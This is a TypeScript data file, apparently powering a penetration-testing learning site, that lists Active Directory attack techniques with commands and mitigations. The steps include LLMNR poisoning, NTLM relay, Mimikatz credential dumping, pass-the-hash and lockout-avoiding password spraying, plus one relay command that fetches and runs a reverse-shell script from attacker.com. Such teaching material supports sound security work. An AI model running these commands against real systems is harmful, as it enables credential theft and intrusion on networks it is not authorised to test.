
export interface AttackStep {
  title: string;
  description: string;
  code?: string;
}

export interface PentestTechnique {
  id: string;
  title: string;
  shortDescription: string;
  description: string;
  attackSteps: AttackStep[];
  mitigations: string[];
}

export const techniques: PentestTechnique[] = [
  {
    id: "llmnr-poisoning",
    title: "LLMNR & NBT-NS Poisoning",
    shortDescription: "Exploiting name resolution protocols to capture NetNTLM hashes.",
    description: `
      <p>LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are protocols used for name resolution when DNS fails. They're enabled by default in Windows environments and can be exploited to capture NetNTLM hashes.</p>
      <p>When a Windows machine fails to resolve a hostname via DNS, it falls back to broadcasting LLMNR and NBT-NS queries on the local network. An attacker can listen for these broadcasts and respond to them, forcing the victim to send their NetNTLM hash.</p>
    `,
    attackSteps: [
      {
        title: "Setting up Responder",
        description: "Responder by Laurent Gaffié is the most popular tool for LLMNR/NBT-NS poisoning. It listens for name resolution requests and responds to them, forcing authentication.",
        code: "sudo responder -I eth0 -rv"
      },
      {
        title: "Forcing a name resolution request",
        description: "On a victim machine, attempt to connect to a non-existent share to trigger name resolution.",
        code: "net use \\\\fakehost\\share"
      },
      {
        title: "Capturing and cracking hashes",
        description: "Responder will capture NetNTLM hashes which can be cracked with tools like Hashcat.",
        code: "hashcat -m 5600 captured_hash.txt rockyou.txt --force"
      },
      {
        title: "Alternative: Using Inveigh on Windows",
        description: "For Windows environments, Inveigh provides similar functionality to Responder.",
        code: "Import-Module .\\Inveigh.ps1\nInvoke-Inveigh -NBNS Y -LLMNR Y -HTTP N"
      }
    ],
    mitigations: [
      "Disable LLMNR via Group Policy: <code>Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled</code>",
      "Disable NBT-NS: <code>Network Adapter Properties → IPv4 Properties → Advanced → WINS tab → Disable NetBIOS over TCP/IP</code>",
      "Enable SMB Signing to prevent relay attacks: <code>Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true</code>",
      "Implement strong password policies to make hash cracking more difficult."
    ]
  },
  {
    id: "guest-user-identify",
    title: "Guest User Identification",
    shortDescription: "Techniques to identify guest user accounts on networks.",
    description: `
      <p>Guest users and accounts are often overlooked in security assessments but can provide significant attack vectors. Identifying these accounts is a crucial step in understanding the security posture of a network.</p>
      <p>Guest accounts may have unexpected privileges, outdated passwords, or might be using default credentials. They're often created for temporary access and then forgotten about, leaving them vulnerable.</p>
    `,
    attackSteps: [
      {
        title: "Active Directory Enumeration",
        description: "Check for users in the built-in Guests group or accounts with guest-like properties.",
        code: "Get-ADUser -Filter 'memberOf -RecursiveMatch \"CN=Guests,CN=Builtin,DC=domain,DC=local\"'"
      },
      {
        title: "Network Traffic Analysis",
        description: "Monitor DHCP requests to find devices with generic hostnames that may indicate guest systems.",
        code: "dhcp.option.hostname contains \"Guest\""
      },
      {
        title: "Checking Shared Folder Access",
        description: "Examine SMB sessions to identify unauthorized or guest access to shared resources.",
        code: "Get-SmbSession | Select-Object ClientComputerName, Username"
      },
      {
        title: "Using Nmap for Guest Device Discovery",
        description: "Scan the network to detect unknown or guest devices based on MAC addresses or open ports.",
        code: "nmap -sn 192.168.1.0/24 --open"
      }
    ],
    mitigations: [
      "Disable default guest accounts: <code>Net user Guest /active:no</code>",
      "Implement Network Access Control (NAC) to restrict unauthorized devices",
      "Use 802.1X authentication for network access",
      "Monitor DHCP logs for unexpected or unknown devices",
      "Enforce strong security policies for temporary accounts including automatic expiration"
    ]
  },
  {
    id: "enumerate-domain",
    title: "Domain Enumeration",
    shortDescription: "Gathering information about Active Directory domain structure.",
    description: `
      <p>Domain enumeration is the process of gathering information about the structure, users, groups, and policies of an Active Directory domain. This is typically one of the first steps in an Active Directory penetration test.</p>
      <p>Effective domain enumeration can reveal security misconfigurations, overly permissive access controls, and potential attack vectors within the domain infrastructure.</p>
    `,
    attackSteps: [
      {
        title: "Initial Domain Discovery",
        description: "Determine the domain name and identify domain controllers.",
        code: "nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local"
      },
      {
        title: "Enumerate Domain Trusts",
        description: "Identify trust relationships between domains that could be leveraged for lateral movement.",
        code: "Get-DomainTrust\n# Or using PowerView\nGet-NetDomainTrust"
      },
      {
        title: "Identify Domain Policies",
        description: "Gather information about domain password policies and security settings.",
        code: "Get-DomainPolicy\n# Or using native commands\nnet accounts"
      },
      {
        title: "Map Domain Structure",
        description: "Use tools like BloodHound to visualize the domain structure and identify attack paths.",
        code: "# Using SharpHound\nInvoke-BloodHound -CollectionMethod All -Verbose"
      }
    ],
    mitigations: [
      "Implement least privilege access controls across the domain",
      "Regularly audit domain trusts and remove unnecessary relationships",
      "Use strong password policies and enable MFA where possible",
      "Monitor for unusual domain enumeration activities using event logs (Event IDs 4624, 4625, 4768, 4769)",
      "Segment the network to limit the scope of domain enumeration attempts"
    ]
  },
  {
    id: "enumerate-username",
    title: "Username Enumeration",
    shortDescription: "Discovering valid usernames in various systems and services.",
    description: `
      <p>Username enumeration is the process of discovering valid user accounts in a system or environment. This can be done through various techniques across different protocols and services.</p>
      <p>Once valid usernames are identified, they can be used in further attacks like password spraying, brute forcing, or targeted social engineering.</p>
    `,
    attackSteps: [
      {
        title: "Active Directory Username Enumeration",
        description: "Enumerate users from Active Directory services using tools like CrackMapExec.",
        code: "crackmapexec smb 192.168.1.100 --users\nldapsearch -x -h 192.168.1.100 -b \"dc=corp,dc=local\" \"(objectClass=user)\""
      },
      {
        title: "SMB Username Enumeration",
        description: "Use tools like Enum4Linux to extract user lists from SMB services, including non-AD environments.",
        code: "enum4linux -U 192.168.1.100\n# Or with Metasploit\nuse auxiliary/scanner/smb/smb_enumusers"
      },
      {
        title: "Web Application Username Enumeration",
        description: "Identify valid users through different responses in login forms or password reset functionality.",
        code: "# Using Hydra for WordPress username enumeration\nhydra -L users.txt -p Password123! http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username\""
      },
      {
        title: "Email & OSINT Enumeration",
        description: "Use open-source intelligence and email harvesting to discover organizational usernames.",
        code: "theHarvester -d example.com -b google,linkedin"
      }
    ],
    mitigations: [
      "Configure services to provide generic error messages that don't reveal if a username exists",
      "Implement rate limiting on authentication endpoints to prevent automated enumeration",
      "Disable SMB NULL sessions with <code>RestrictAnonymous=2</code> in the registry",
      "Use strong LDAP authentication controls to prevent anonymous queries",
      "Monitor for multiple failed login attempts from the same source IP address"
    ]
  },
  {
    id: "ntlm-relay",
    title: "NetNTLM Relay Over SMB",
    shortDescription: "Intercepting and relaying NTLM authentication to gain unauthorized access.",
    description: `
      <p>NetNTLM relay attacks exploit Windows authentication by intercepting NTLM challenge-response authentication attempts and forwarding them to another system. This allows an attacker to authenticate to servers as the victim without knowing their password.</p>
      <p>SMB (Server Message Block) is one of the most common protocols targeted in NTLM relay attacks, especially in environments where SMB signing is not enforced.</p>
    `,
    attackSteps: [
      {
        title: "Identify Targets Without SMB Signing",
        description: "Use Nmap to scan for systems that have SMB signing disabled, making them vulnerable to relay attacks.",
        code: "nmap -p 445 --script smb2-security-mode 192.168.1.0/24"
      },
      {
        title: "Configure Responder for Relay",
        description: "Modify Responder configuration to prevent hash capture and allow relay attacks.",
        code: "# Edit /etc/responder/Responder.conf\n# Set SMB = Off\n# Set HTTP = Off\npython3 Responder.py -I eth0 -rv"
      },
      {
        title: "Set up NTLM Relay",
        description: "Use ntlmrelayx.py to relay captured NTLM authentication to target systems.",
        code: "python3 ntlmrelayx.py -tf targets.txt -smb2support"
      },
      {
        title: "Execute Commands via Relayed Authentication",
        description: "If successful, execute commands on the target system using the relayed credentials.",
        code: "python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\\'http://attacker.com/rev.ps1\\')\"'"
      }
    ],
    mitigations: [
      "Enable SMB Signing on all Windows systems: <code>Set-SmbServerConfiguration -RequireSecuritySignature $true</code>",
      "Use LDAP signing and channel binding to prevent LDAP relay attacks",
      "Disable LLMNR and NetBIOS Name Service to prevent capturing authentication attempts",
      "Implement network segmentation to limit the impact of relay attacks",
      "Monitor for unexpected authentication attempts and SMB sessions"
    ]
  },
  {
    id: "ipv6-attack",
    title: "IPv6-Based Attacks (mitm6)",
    shortDescription: "Exploiting default IPv6 behavior to perform MitM attacks.",
    description: `
      <p>IPv6-based attacks using mitm6 exploit the default IPv6 configuration in Windows environments. The tool abuses the fact that Windows prioritizes IPv6 over IPv4 even when no IPv6 infrastructure exists.</p>
      <p>By spoofing IPv6 router advertisements and DNS responses, an attacker can force clients to use a malicious DNS server, enabling man-in-the-middle attacks and NetNTLM hash capturing.</p>
    `,
    attackSteps: [
      {
        title: "Start the mitm6 Attack",
        description: "Launch mitm6 to begin spoofing IPv6 router advertisements and DNS responses.",
        code: "python3 mitm6.py -d domain.local"
      },
      {
        title: "Set up NTLM Relay with LDAP Target",
        description: "Configure ntlmrelayx.py to relay captured NTLM authentication to LDAP services.",
        code: "python3 ntlmrelayx.py -6 -t ldap://192.168.1.10 -wh fakewpad --delegate-access"
      },
      {
        title: "Creating a New Computer Account",
        description: "If successful, the attack will create a new computer account with delegation rights.",
        code: "# This happens automatically if --delegate-access is specified\n# Look for 'Delegation rights added' in the output"
      },
      {
        title: "Exploit Resource-Based Constrained Delegation",
        description: "Use the created computer account to perform further attacks like Resource-Based Constrained Delegation.",
        code: "python3 getST.py -spn cifs/target-dc domain.local/computer-account -impersonate administrator"
      }
    ],
    mitigations: [
      "Disable IPv6 if not in use: <code>Set-NetAdapterBinding -Name 'Ethernet' -ComponentID ms_tcpip6 -Enabled $false</code>",
      "Block DHCPv6 traffic and router advertisements via Windows Firewall",
      "Implement LDAP signing and channel binding to prevent LDAP relay attacks",
      "Use Protected Users group for sensitive accounts to prevent delegation attacks",
      "Monitor for unexpected IPv6 traffic in predominantly IPv4 networks"
    ]
  },
  {
    id: "password-attacks",
    title: "Brute Force & Password Spray",
    shortDescription: "Techniques to discover weak credentials in multiple services.",
    description: `
      <p>Password attacks attempt to discover valid credentials by either trying many passwords against a single account (brute force) or trying a few common passwords against many accounts (password spraying).</p>
      <p>Password spraying is often more effective and less likely to trigger account lockouts, as it tries a small number of common passwords across many accounts.</p>
    `,
    attackSteps: [
      {
        title: "SMB Password Spraying with Metasploit",
        description: "Use Metasploit's smb_login module to attempt common passwords against multiple SMB users.",
        code: "use auxiliary/scanner/smb/smb_login\nset RHOSTS 192.168.1.10\nset USER_FILE users.txt\nset PASSWORD Spring2024!\nset THREADS 10\nrun"
      },
      {
        title: "Password Spraying with CrackMapExec",
        description: "CrackMapExec allows for efficient password spraying across multiple protocols including SMB, WinRM, and MSSQL.",
        code: "crackmapexec smb 192.168.1.0/24 -u users.txt -p \"Welcome123!\""
      },
      {
        title: "Targeted Brute Force with Hydra",
        description: "For specific targets, Hydra can attempt multiple passwords against services like SSH, FTP, or web applications.",
        code: "hydra -L users.txt -P passwords.txt smb://192.168.1.10"
      },
      {
        title: "Avoiding Account Lockouts",
        description: "Implement delays between attempts and monitor for account lockout policies to avoid triggering security alerts.",
        code: "# Using CrackMapExec with a delay\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p common-passwords.txt --delay 5"
      }
    ],
    mitigations: [
      "Implement account lockout policies after a reasonable number of failed attempts",
      "Use multi-factor authentication (MFA) to prevent password-only attacks",
      "Enforce strong password policies with minimum complexity requirements",
      "Monitor for multiple failed login attempts from the same source",
      "Use adaptive authentication that considers login behavior and risk factors"
    ]
  },
  {
    id: "adcs-attack",
    title: "ADCS NTLM Relay Attack",
    shortDescription: "Exploiting Active Directory Certificate Services for privilege escalation.",
    description: `
      <p>Active Directory Certificate Services (ADCS) NTLM relay attacks exploit misconfigured certificate enrollment services to gain unauthorized access and elevate privileges within a domain.</p>
      <p>By relaying captured NTLM authentication to an ADCS web enrollment endpoint, an attacker can request certificates that enable Kerberos authentication as any user, including domain administrators.</p>
    `,
    attackSteps: [
      {
        title: "Identify ADCS Web Enrollment",
        description: "First, check if ADCS web enrollment services are available in the target domain.",
        code: "certipy find -u 'DOMAIN\\user:password' -dc-ip 192.168.1.100\n# Or\ncertutil -config - -ping"
      },
      {
        title: "Set up NTLM Relay Targeting ADCS",
        description: "Configure ntlmrelayx.py to relay NTLM authentication to the ADCS web enrollment endpoint.",
        code: "python3 ntlmrelayx.py -t http://adcs-server/certsrv/ --adcs"
      },
      {
        title: "Force Authentication using PetitPotam",
        description: "Use PetitPotam or other coercion techniques to force a domain controller to authenticate to the attacker.",
        code: "python3 PetitPotam.py -d domain.local -u user -p pass attacker-ip dc-ip"
      },
      {
        title: "Use the Certificate for Domain Admin Access",
        description: "Once a certificate is obtained, use it to request a Kerberos ticket for domain admin access.",
        code: "Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /domain:domain.local /ptt"
      }
    ],
    mitigations: [
      "Disable NTLM authentication on ADCS web enrollment: <code>Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/Default Web Site/CertSrv' -filter \"system.webServer/security/authentication/windowsAuthentication\" -name \"enabled\" -value False</code>",
      "Enforce HTTPS for all ADCS web enrollment services",
      "Implement Extended Protection for Authentication (EPA) on ADCS servers",
      "Patch systems against PetitPotam and other authentication coercion techniques",
      "Monitor for unexpected certificate requests and authentications"
    ]
  },
  {
    id: "pass-the-hash",
    title: "Pass-the-Hash Attack",
    shortDescription: "Using captured NTLM hashes to authenticate without knowing the password.",
    description: `
      <p>Pass-the-Hash (PtH) is a technique where attackers use captured NTLM password hashes to authenticate to systems without knowing the actual plaintext password.</p>
      <p>This attack works because Windows authentication protocols like NTLM don't require the actual password for authentication, just a valid hash, making it a powerful technique for lateral movement after initial compromise.</p>
    `,
    attackSteps: [
      {
        title: "Extract NTLM Hashes using Mimikatz",
        description: "On a compromised system, use Mimikatz to extract NTLM hashes from memory or the SAM database.",
        code: "privilege::debug\nsekurlsa::logonpasswords\n# Or for SAM database\nlsadump::sam"
      },
      {
        title: "Pass-the-Hash with Mimikatz",
        description: "Use Mimikatz to create a new session with the captured NTLM hash.",
        code: "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee /run:powershell.exe"
      },
      {
        title: "Pass-the-Hash with CrackMapExec",
        description: "Use CrackMapExec to authenticate to remote systems using the NTLM hash.",
        code: "crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee"
      },
      {
        title: "Execute Commands using PtH",
        description: "Once authenticated with the hash, execute commands on the remote system.",
        code: "crackmapexec winrm 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee -x \"whoami /all\""
      }
    ],
    mitigations: [
      "Implement the Local Administrator Password Solution (LAPS) to prevent password reuse across systems",
      "Enforce SMB signing to prevent NTLM relay attacks: <code>Set-SmbServerConfiguration -RequireSecuritySignature $true</code>",
      "Use Credential Guard to protect credential hashes in memory",
      "Implement Just-In-Time administration and Privileged Access Management",
      "Monitor for unexpected authentication events, especially from unexpected source systems"
    ]
  }
];
